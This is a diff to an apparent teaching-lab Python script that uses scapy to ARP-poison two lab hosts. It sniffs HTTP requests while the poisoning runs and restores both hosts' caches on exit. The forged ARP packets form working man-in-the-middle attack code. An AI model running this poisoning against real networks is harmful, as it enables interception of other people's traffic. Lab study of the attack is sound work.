@@ -8,13 +8,13 @@ Lab - ARP Spoof Attack
 (CC BY-SA 4.0) github.com/moospit
 """
 
+from scapy.all import ARP, send, AsyncSniffer, Packet, Raw
+from scapy.layers.http import HTTPRequest
 import logging
 import time
 
 # supress scapy import warnings
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
-from scapy.layers.http import HTTPRequest
-from scapy.all import ARP, send, AsyncSniffer, Packet, Raw
 
 
 def process_packet(pkt: Packet) -> None:
@@ -39,9 +39,9 @@ def main() -> None:
         sniff.start()
         print('[>] Starting poisoning')
         while True:
-            send(ARP(op='is-at', pdst='10.10.0.101',
+            send(ARP(op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
                  psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'), verbose=False)
-            send(ARP(op='is-at', pdst='10.10.0.102',
+            send(ARP(op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
                  psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'), verbose=False)
             time.sleep(1)  # don't flood the network
     except KeyboardInterrupt:
@@ -50,10 +50,10 @@ def main() -> None:
 
     # clean up victim's arp caches
     print('[>] Cleaning up')
-    send(ARP(op='is-at', pdst='10.10.0.101', psrc='10.10.0.102',
-         hwsrc='00:00:00:00:00:02'), verbose=False)
-    send(ARP(op='is-at', pdst='10.10.0.102', psrc='10.10.0.101',
-         hwsrc='00:00:00:00:00:01'), verbose=False)
+    send(ARP(op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
+             psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'), verbose=False)
+    send(ARP(op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
+             psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'), verbose=False)
 
 
 if __name__ == '__main__':
